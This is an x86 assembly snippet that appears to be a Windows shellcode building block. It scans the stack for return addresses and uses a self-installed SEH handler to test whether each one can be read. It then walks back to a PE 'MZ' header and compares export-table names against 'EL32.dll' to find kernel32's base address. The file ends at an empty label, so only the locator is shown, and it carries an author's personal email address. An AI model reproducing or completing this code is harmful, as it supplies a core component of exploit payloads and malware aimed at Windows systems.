; Author: Tarek Ahmed
; All rights reserved
; Email: unix.geek2014@gmail.com


sub esp, 08h
xor eax, eax
cdq
xchg edx, ecx


StackWalk :
	mov ebx, [esp + ecx]
	mov edx, ebx
	shr ebx, 28
	add ecx, 4
	cmp ebx, 07h
	jne StackWalk




checking:

	mov [ebp-0ch], ecx
	push edx
	call checkAddress
	cmp eax, 0
	je valid
	mov ecx, [ebp-0ch]
	jmp short StackWalk


valid :
	mov ecx, [ebp-0ch]
	mov ax, 1001h
	add eax, 0efffh

	sub edx, eax


	mov dx, ax


	xchg edx, ebx
	mov ax, [ebx]
	cmp ax, 5a4dh
	jne StackWalk
	mov edi, [ebx + 3ch]
	add edi, ebx
	mov edi, [edi + 78h]
	add edi, ebx
	mov edi, [edi + 0ch]
	add edi, ebx
	add edi, 04h

	xor eax, eax
	push eax
	push 6c6c642eh;.dll
	push 32334c45h; EL32
	mov esi, esp

checkKernel :
	mov edx, ecx
	mov ecx, 8
	cld

	repe cmpsb
	cmp ecx, 0
	je foundKernel
	mov ecx, edx
	jmp StackWalk

; jmp brute


; Exception Handler function

checkAddress :
	push ebp
	mov ebp, esp
	jmp rev1
	reverse:
	pop eax
	jmp eax
	rev1:
	call reverse
	add eax, 1eh
	push eax
	xor edi, edi
	push dword ptr FS : [edi]
	mov dword ptr fs : [edi] , esp
	mov eax, dword ptr ss : [ebp + 8]
	mov eax, dword ptr ds : [eax] ; Can we read address at EAX ?

	xor eax, eax; Return eax 0 if no exception occured

	jmp short cleanup

	; Exception handler entry point
	xor eax, eax
	inc eax
	mov esp, dword ptr fs : [edi]
	mov esp, dword ptr ss : [esp]


cleanup :
	pop dword ptr fs : [edi]
	add esp, 4
	pop ebp
	retn 4

foundKernel :
	
